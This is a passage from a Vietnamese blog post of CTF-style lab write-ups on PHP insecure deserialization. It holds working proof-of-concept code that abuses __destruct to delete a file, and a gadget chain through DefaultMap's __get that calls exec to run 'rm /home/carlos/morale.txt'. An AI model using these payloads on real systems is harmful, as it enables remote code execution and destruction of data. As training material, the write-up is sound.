<p><img src="https://hackmd.io/_uploads/SJe32HY0p.png" alt="image"></p>
</li>
<li>
<p>Đăng nhập với viewner.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/rJVzTrFAa.png" alt="image"></p>
</li>
<li>
<p>Phát hiện ra gợi ý lỗ hổng serialize object ở <code>/my-account</code></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HkEp6StCT.png" alt="image"></p>
</li>
<li>
<p>Nhưng mà ở đây khác bài trước là ta không tìm thấy cách để xóa luôn, giờ thì mình thử recon thêm.</p>
</li>
<li>
<p>Sau đó mình phát hiện ra có 1 file cũng được load là <code>/libs/CustomTemplate.php</code></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/r14jkLFCT.png" alt="image"></p>
</li>
<li>
<p>Nhưng mà khi get thì file này render ở sever side nên không thể đọc source lúc nào mình dùng trick ~ để đọc file backup và được lun:&gt;</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/BkGlxUt0T.png" alt="image"></p>
</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="k">class</span> <span class="nc">CustomTemplate</span> <span class="p">{</span>
    <span class="k">private</span> <span class="nv">$template_file_path</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$lock_file_path</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$template_file_path</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template_file_path</span> <span class="o">=</span> <span class="nv">$template_file_path</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lock_file_path</span> <span class="o">=</span> <span class="nv">$template_file_path</span> <span class="o">.</span> <span class="s2">&#34;.lock&#34;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">isTemplateLocked</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lock_file_path</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getTemplate</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template_file_path</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">saveTemplate</span><span class="p">(</span><span class="nv">$template</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isTemplateLocked</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lock_file_path</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;Could not write to &#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lock_file_path</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template_file_path</span><span class="p">,</span> <span class="nv">$template</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;Could not write to &#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template_file_path</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="c1">// Carlos thought this would be a good idea
</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lock_file_path</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lock_file_path</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><ul>
<li>
<p>Ta có thể thấy đây là 1 thư viện để hiển thị template chứa 2 tham số trong class CustomTeamplate, hàm __destruct() là một magic method sẽ được gọi khi đây là phương thức được xử lí các tác vụ cuối cùng khi một đối tượng bị hủy hoặc giải phóng bộ nhớ.</p>
</li>
<li>
<p>Vì vậy chúng ta có thể lợi dụng hàm này và hàm unlink để xóa file morale.txt từ carlos vì khi mà 1 đối tượng bị hủy thì sẽ gọi đến destruct</p>
</li>
<li>
<p>Triển khai:</p>
</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
   <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span> 
   <span class="k">public</span>  <span class="nv">$access_token</span><span class="p">;</span>
   <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$access_token</span><span class="p">){</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">access_token</span> <span class="o">=</span> <span class="nv">$access_token</span><span class="p">;</span>
   <span class="p">}</span>

<span class="p">}</span>

<span class="c1">// $poc = new User(&#34;viewner&#34;, &#34; ob4nfdfe5htvwuykpn0zykbvjh645uxw&#34;, &#34;/home/carlos/morale.txt&#34;);
</span><span class="c1"></span>
<span class="c1">// $poc = serialize($poc);
</span><span class="c1"></span>
<span class="c1">// echo base64_encode($poc);
</span><span class="c1"></span>
<span class="nv">$a</span><span class="o">=</span> <span class="s2">&#34;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ3bjYxYjFhMmphZWpoODZsbGxqaDc3NWo2eG9qNGdveCI7fQ%3d%3d&#34;</span><span class="p">;</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>

<span class="nv">$b</span><span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>

<span class="nx">print_r</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>

<span class="cp">?&gt;</span><span class="err">
</span><span class="err">
</span><span class="err">---&gt; 
</span><span class="err">(
</span><span class="err">    [username] =&gt; wiener
</span><span class="err">    [access_token] =&gt; wn61b1a2jaejh86llljh775j6xoj4gox
</span><span class="err">)
</span></code></pre></div><ul>
<li>POC:</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>


<span class="k">class</span> <span class="nc">CustomTemplate</span> <span class="p">{</span>
    <span class="k">private</span> <span class="nv">$template_file_path</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$lock_file_path</span><span class="o">=</span> <span class="s2">&#34;/home/carlos/morale.txt&#34;</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$template_file_path</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template_file_path</span> <span class="o">=</span> <span class="nv">$template_file_path</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lock_file_path</span> <span class="o">=</span> <span class="nv">$template_file_path</span> <span class="o">.</span> <span class="s2">&#34;.lock&#34;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">isTemplateLocked</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lock_file_path</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getTemplate</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template_file_path</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">saveTemplate</span><span class="p">(</span><span class="nv">$template</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isTemplateLocked</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lock_file_path</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;Could not write to &#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lock_file_path</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template_file_path</span><span class="p">,</span> <span class="nv">$template</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;Could not write to &#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template_file_path</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="c1">// Carlos thought this would be a good idea
</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lock_file_path</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lock_file_path</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
   <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span> 
   <span class="k">public</span>  <span class="nv">$access_token</span><span class="p">;</span>
   <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$access_token</span><span class="p">){</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">access_token</span> <span class="o">=</span> <span class="nv">$access_token</span><span class="p">;</span>
   <span class="p">}</span>

<span class="p">}</span>

<span class="c1">// $poc = new User(&#34;viewner&#34;, &#34; ob4nfdfe5htvwuykpn0zykbvjh645uxw&#34;);
</span><span class="c1"></span>
<span class="nv">$poc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CustomTemplate</span><span class="p">(</span><span class="s2">&#34;/home/carlos/morale.txt&#34;</span><span class="p">);</span>


<span class="nv">$poc</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$poc</span><span class="p">);</span>

<span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$poc</span><span class="p">);</span>

<span class="c1">// $a= &#34;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ3bjYxYjFhMmphZWpoODZsbGxqaDc3NWo2eG9qNGdveCI7fQ%3d%3d&#34;;
</span><span class="c1"></span>
<span class="c1">// $a = base64_decode($a);
</span><span class="c1"></span>
<span class="c1">// $b= unserialize($a);
</span><span class="c1"></span>
<span class="c1">// print_r($b);
</span><span class="c1"></span>
</code></pre></div><ul>
<li>
<p><img src="https://hackmd.io/_uploads/HkmMQ8tR6.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/ByTiQ8YRT.png" alt="image"></p>
</li>
<li>
<p>Mặc dù 500 nhưng mà khi server deserialize thì đã gọi hàm destruct và xóa file morale.txt rồi nên bài lab được solved:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/BkoJEIFAp.png" alt="image"></p>
</li>
</ul>
<h4 id="lab-developing-a-custom-gadget-chain-for-php-deserialization">Lab: Developing a custom gadget chain for PHP deserialization</h4>
<ul>
<li>
<p><img src="https://hackmd.io/_uploads/Sk5CfvFCp.png" alt="image"></p>
</li>
<li>
<p>Đề bài yêu cầu tận dụng lỗ hổng desirealize dẫn đến RCE để xóa file <code>morale.txt</code> trong thư mục home của carlos trên server.</p>
</li>
<li>
<p>Giao diện ta vào đầu tiên sẽ như thế này:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/Hy7SXvYRa.png" alt="image"></p>
</li>
<li>
<p>Bắt đầu bước recon ta sẽ đi khám phá tất cả những chức năng của bài lab:</p>
</li>
<li>
<p>Có thể thấy trang web vẫn chứa lỗ hổng insecure deserialize ở /my-account</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/B1opXwYCp.png" alt="image"></p>
</li>
<li>
<p>Nhưng mà vẫn chưa thấy class để chúng ta có thể khai thác để thực thi RCE.</p>
</li>
<li>
<p>Quan sát kỹ một tí trong target ta thấy</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/B1FbNPtRT.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/B16MEwKCp.png" alt="image"></p>
</li>
<li>
<p>Đây có vẻ là một file php nhưng mà render ở trên sever side cho nên ta không đọc được, sử dụng trick như bài trên để đọc được file backup của nó.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HkhUNvFR6.png" alt="image"></p>
</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="k">class</span> <span class="nc">CustomTemplate</span> <span class="p">{</span>
    <span class="k">private</span> <span class="nv">$default_desc_type</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$desc</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$product</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$desc_type</span><span class="o">=</span><span class="s1">&#39;HTML_DESC&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">desc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Description</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">default_desc_type</span> <span class="o">=</span> <span class="nv">$desc_type</span><span class="p">;</span>
        <span class="c1">// Carlos thought this is cool, having a function called in two places... What a genius
</span><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">build_product</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__sleep</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">[</span><span class="s2">&#34;default_desc_type&#34;</span><span class="p">,</span> <span class="s2">&#34;desc&#34;</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">build_product</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">build_product</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">product</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Product</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">default_desc_type</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">desc</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Product</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$desc</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$default_desc_type</span><span class="p">,</span> <span class="nv">$desc</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">desc</span> <span class="o">=</span> <span class="nv">$desc</span><span class="o">-&gt;</span><span class="nv">$default_desc_type</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Description</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$HTML_DESC</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$TEXT_DESC</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
        <span class="c1">// @Carlos, what were you thinking with these descriptions? Please refactor!
</span><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">HTML_DESC</span> <span class="o">=</span> <span class="s1">&#39;&lt;p&gt;This product is &lt;blink&gt;SUPER&lt;/blink&gt; cool in html&lt;/p&gt;&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">TEXT_DESC</span> <span class="o">=</span> <span class="s1">&#39;This product is cool in text&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">DefaultMap</span> <span class="p">{</span>
    <span class="k">private</span> <span class="nv">$callback</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callback</span> <span class="o">=</span> <span class="nv">$callback</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callback</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span><span class="err">
</span><span class="err">
</span><span class="err">
</span><span class="err">* CustomTemplate : 
</span><span class="err">- Ta có có thể thấy magic method `__construct` được gọi khi mà 1 đối tượng mới được khởi tạo từ `CustomTemplate`
</span><span class="err">- Nhận tham số mặc định là `$desc_type=&#39;HTML_DESC&#39;` sau đó tạo một đối tượng mới từ `class Description` gán vào giá trị của `desc` trong class này, sau đó gọi đến phương thức `build_product` gán `product` bằng việc khởi tạo một đối tượng mới từ class `Product` 
</span><span class="err">
</span><span class="err">
</span><span class="err">* DefaultMap :-1: 
</span><span class="err">
</span><span class="err">- Chú ý đến class này có một thuộc tính private là `$callback` khi khởi tạo sẽ gán bằng giá trị truyền vào và có  magic method `__get()` sẽ gọi hàm `return call_user_func($this-&gt;callback, $name);` vì vậy nếu như ta control callback này là một hàm thực thi thì ta có thể RCE được.
</span><span class="err">
</span><span class="err">- Thêm một ý quan trọng là method `__get()` sẽ được gọi khi mà một đối tượng gọi 1 phương thức không tồn tại hoặc không thể sử dụng của nó.
</span><span class="err">
</span><span class="err">- Từ các phân tích trên thì mình có thể xây dựng được POC như sau:
</span><span class="err">
</span><span class="err">```php
</span><span class="err">&lt;?php
</span><span class="err">
</span><span class="err">class CustomTemplate {
</span><span class="err">                                        public $default_desc_type;
</span><span class="err">                                        public $desc;
</span><span class="err">                                    
</span><span class="err">                                    }
</span><span class="err">
</span><span class="err">class DefaultMap {
</span><span class="err">                                        public $callback;
</span><span class="err">                                    
</span><span class="err">                                        public function __construct($callback) {
</span><span class="err">                                            $this-&gt;callback = $callback;
</span><span class="err">                                        }
</span><span class="err">                                    
</span><span class="err">                                        public function __get($name) {
</span><span class="err">                                            return call_user_func($this-&gt;callback, $name);
</span><span class="err">                                        }
</span><span class="err">                                    }
</span><span class="err">
</span><span class="err">$b = new DefaultMap(&#34;exec&#34;);
</span><span class="err">
</span><span class="err">$a = new CustomTemplate();
</span><span class="err">
</span><span class="err">$a-&gt;default_desc_type=&#34;rm /home/carlos/morale.txt&#34;;
</span><span class="err">
</span><span class="err">$a-&gt;desc = $b;
</span><span class="err">
</span><span class="err">$poc = serialize($a);
</span><span class="err">
</span><span class="err">echo base64_encode($poc);
</span><span class="err">
</span><span class="err">?&gt;
</span></code></pre></div><ul>
<li>
<p><img src="https://hackmd.io/_uploads/HJVOBl5Ra.png" alt="image"></p>
</li>
<li>
<p>giải thích một chút nha ở đây sau khi deserial thì sẽ gọi đến magic method <code>__wakeup()</code> sau đó tiến hành gọi method <code>build_product</code> tiến hành gán giá trị cho thuộc tính <code>product</code> là khởi tạo đối tượng từ class <code>Product</code> truyền vào 2 giá trị <code>$this-&gt;default_desc_type, $this-&gt;desc</code> sau đó tiến hành gán giá trị <code>desc</code> bằng giá trị <code>$desc-&gt;$default_desc_type</code> nhưng mà như POC ở trên ta không có thuộc tính <code>default_desc_type</code> của $desc được khởi tạo vì mình gán nó bằng đối tượng được khởi tạo từ <code>DefaultMap</code> rồi vì vậy cho nên lúc này server sẽ hiểu là phải gọi đến thuộc tính của đôi tượng từ <code>DefaultMap</code> này mà nó không tồn tại cho nên magic method <code>__get($name)</code> sẽ được gọi để gọi đến hàm <code>call_user_func</code> với 2 tham số là <code>callback=&quot;exec&quot;</code> và <code>name=</code> sẽ có giá trị là <code>default_desc_type</code> vì vậy nên hàm thực thi xóa file morale.txt trong thư mục home trên máy chủ của <code>carlos</code> sẽ bị xóa và bài lab được solved.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/BJEeLx506.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/S1BZIg5Ra.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/ryKZ8e5Ap.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/S1dMIxcCT.png" alt="image"></p>
</li>
</ul>


        
          <div class="blog-tags">
            
              
              <a href="https://l3mnt2010.github.io/tags/ctf/">CTF</a>&nbsp;
            
              
              <a href="https://l3mnt2010.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
            
              
              <a href="https://l3mnt2010.github.io/tags/deserialize/">Deserialize</a>&nbsp;
            
          </div>
        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://l3mnt2010.github.io/java-security/" data-toggle="tooltip" data-placement="top" title="Java security">&larr; Previous Post</a>
            </li>
          
          
        </ul>
      


      

    </div>
  </div>
</div>

      <footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
          
        </ul>
        <p class="credits copyright text-muted">
          

          &nbsp;&bull;&nbsp;&copy;
          
            0001
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://l3mnt2010.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://l3mnt2010.github.io/js/load-photoswipe.js"></script>










    
  </body>
</html>

